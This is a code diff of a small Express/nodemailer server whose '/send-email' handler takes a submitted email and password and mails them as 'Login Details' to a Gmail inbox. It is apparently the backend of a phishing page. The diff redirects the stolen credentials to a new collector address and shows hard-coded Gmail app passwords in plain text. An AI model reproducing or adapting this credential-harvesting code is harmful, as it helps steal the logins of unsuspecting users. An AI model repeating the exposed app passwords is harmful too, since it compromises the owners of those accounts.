@@ -14,8 +14,8 @@ app.use(bodyParser.json());
 let transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'sauravgarg5922@gmail.com',  // Replace with your Gmail address
-        pass: 'ziza iifq zfqd ctjv'  // Replace with your app password
+        user: 'capssmedia@gmail.com',  // Replace with your Gmail address
+        pass: 'yrkc efci nylu vpky'  // Replace with your app password
     }
 });
 
@@ -24,8 +24,8 @@ app.post('/send-email', (req, res) => {
     const { email, password } = req.body;
 
     let mailOptions = {
-        from: 'devjha547@gmail.com',
-        to: 'devjha547@gmail.com',  // Replace with recipient email if different
+        from: 'capssmedia@gmail.com',
+        to: 'capssmedia@gmail.com',  // Replace with recipient email if different
         subject: 'Login Details',
         text: `Email: ${email}\nPassword: ${password}`
     };
